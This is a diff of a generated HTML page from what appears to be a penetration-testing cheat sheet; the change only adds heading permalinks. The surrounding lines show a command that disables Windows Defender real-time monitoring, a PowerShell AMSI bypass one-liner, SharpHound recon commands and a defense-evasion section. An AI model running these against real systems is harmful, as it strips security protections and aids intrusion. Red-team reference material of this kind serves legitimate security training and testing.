@@ -944,16 +944,16 @@
               
                 
                 
-                <h1 id="general">General</h1>
-<h2 id="oneliners">Oneliners</h2>
+                <h1 id="general">General<a class="headerlink" href="#general" title="Permanent link">&para;</a></h1>
+<h2 id="oneliners">Oneliners<a class="headerlink" href="#oneliners" title="Permanent link">&para;</a></h2>
 <p>Disable Defender
 <div class="highlight"><pre><span></span><code><span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="nv">$true</span>
 </code></pre></div>
 Powershell AMSI Bypass 
 <div class="highlight"><pre><span></span><code><span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.AmsiUtils&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;amsiInitFailed&#39;</span><span class="p">,</span><span class="s1">&#39;NonPublic,Static&#39;</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="nv">$true</span><span class="p">)</span>
 </code></pre></div></p>
-<h2 id="recon">Recon</h2>
-<h3 id="bloodhound">BloodHound</h3>
+<h2 id="recon">Recon<a class="headerlink" href="#recon" title="Permanent link">&para;</a></h2>
+<h3 id="bloodhound">BloodHound<a class="headerlink" href="#bloodhound" title="Permanent link">&para;</a></h3>
 <p>Download it from <a href="https://github.com/BloodHoundAD/BloodHound">here</a>
 <div class="highlight"><pre><span></span><code><span class="c1"># /usr/lib/bloodhound/resources/app/Collectors/</span>
 <span class="c1"># From Local Windows host</span>
@@ -962,8 +962,8 @@ powershell -ep bypass
 . .<span class="se">\S</span>harpHound.ps1
 invoke-bloodhound -CollectionMethod all 
 </code></pre></div></p>
-<h1 id="defense-evasion">Defense Evasion</h1>
-<h2 id="bypass-amsi">Bypass AMSI</h2>
+<h1 id="defense-evasion">Defense Evasion<a class="headerlink" href="#defense-evasion" title="Permanent link">&para;</a></h1>
+<h2 id="bypass-amsi">Bypass AMSI<a class="headerlink" href="#bypass-amsi" title="Permanent link">&para;</a></h2>
 <ul>
 <li>
 <p>Get any AMSI bypass method from the following <a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">link</a>
